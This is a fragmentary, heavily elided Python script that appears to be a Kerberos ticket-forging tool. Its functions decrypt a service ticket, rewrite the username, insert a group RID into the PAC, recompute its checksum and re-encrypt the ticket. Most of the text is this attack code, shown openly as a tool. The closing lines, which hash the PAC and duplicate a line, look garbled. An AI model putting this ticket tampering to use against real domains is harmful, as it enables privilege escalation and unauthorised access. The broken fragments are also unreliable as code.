...
def updatetimestampsserverticket(
    ticket, authtime=None, starttime=None, endtime=None, renewtiltime=None
):
...
def addgrouptopac(pac, grouprid):
    version, numentries, pactype, pacsize, offset = struct.unpack("<IIIII", pac[:20].encode('latin-1'))
...
def updateusernameinencpart(key, rawticket, username, debug=False, verbose=False):
    try:
        ...
        encserverticket = (
            serverticket.getComponentByPosition(0)
    ...
    if verbose:
        print("Ticket succesfully decoded")
    ...
    ramticket.getComponentByPosition(2).getComponentByPosition(
        0
    ).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket
...
def getpac(key, rawticket, debug=False, verbose=False):
    ...
    updatetimestampsserverticket(
        decserverticket,
        str(decserverticket[5]),
        str(decserverticket[6]),
        str(decserverticket[7]),
        str(decserverticket[8]),
    )
...
def updatepac(key, rawticket, pac, debug=False, verbose=False):
    ...
    newpac = pac[:-44] + chksum.decode('latin-1') + pac[-28:]
    newpac = newpac.encode('latin-1')
    ...
    # print adifrelevant
    decserverticket.getComponentByPosition(9).getComponentByPosition(
        0
    ).getComponentByPosition(1)._value = encoder.encode(adifrelevant)

    # put the ticket back together again
    newencserverticket = kerberos.encrypt(
        key, 2, encoder.encode(decserverticket), nonce
    )
    ramticket.getComponentByPosition(2).getComponentByPosition(
        0
    ).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        ...
        action="store",
        required=False,
        metavar="64F12CDDAA88057E06A81B54E73B949B",
        type=str,
    ...
    #pac = pacobj.encode()
    pac = pacobj.encode()
    pac = hashlib.sha256(pac.encode()).hexdigest()
    #print(pac)
